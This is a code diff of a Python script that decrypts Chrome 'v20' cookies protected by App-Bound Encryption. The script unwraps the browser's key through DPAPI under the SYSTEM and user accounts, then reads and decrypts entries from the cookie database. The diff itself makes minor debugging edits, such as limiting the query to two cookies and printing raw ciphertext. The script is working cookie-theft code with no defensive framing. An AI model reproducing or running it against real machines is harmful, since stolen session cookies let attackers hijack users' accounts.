@@ -16,11 +16,14 @@ with open(local_state_path, "r") as f:
 
 app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
 
+
+
 arguments = "-c \"" + """import win32crypt
 import binascii
 encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
 print(binascii.b2a_base64(encrypted_key[1]).decode())
 """.replace("\n", ";") + "\""
+
 
 c = Client("localhost")
 c.connect()
@@ -32,12 +35,14 @@ try:
     app_bound_encrypted_key_b64 = binascii.b2a_base64(
         binascii.a2b_base64(app_bound_encrypted_key)[4:]).decode().strip()
 
+
     # decrypt with SYSTEM DPAPI
     encrypted_key_b64, stderr, rc = c.run_executable(
         sys.executable,
         arguments=arguments.format(app_bound_encrypted_key_b64),
         use_system_account=True
     )
+
 
     # decrypt with user DPAPI
     decrypted_key_b64, stderr, rc = c.run_executable(
@@ -47,6 +52,7 @@ try:
     )
 
     decrypted_key = binascii.a2b_base64(decrypted_key_b64)[-61:]
+
     assert(decrypted_key[0] == 1)
 
 finally:
@@ -65,12 +71,11 @@ tag = decrypted_key[1+12+32:]
 
 cipher = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
 key = cipher.decrypt_and_verify(ciphertext, tag)
-print(binascii.b2a_base64(key))
 
 # fetch all v20 cookies
 con = sqlite3.connect(pathlib.Path(cookie_db_path).as_uri() + "?mode=ro", uri=True)
 cur = con.cursor()
-r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies;")
+r = cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) from cookies LIMIT 2;")
 cookies = cur.fetchall()
 cookies_v20 = [c for c in cookies if c[2][:3] == b"v20"]
 con.close()
@@ -81,6 +86,7 @@ con.close()
 def decrypt_cookie_v20(encrypted_value):
     cookie_iv = encrypted_value[3:3+12]
     encrypted_cookie = encrypted_value[3+12:-16]
+    print(encrypted_cookie)
     cookie_tag = encrypted_value[-16:]
     cookie_cipher = AES.new(key, AES.MODE_GCM, nonce=cookie_iv)
     decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
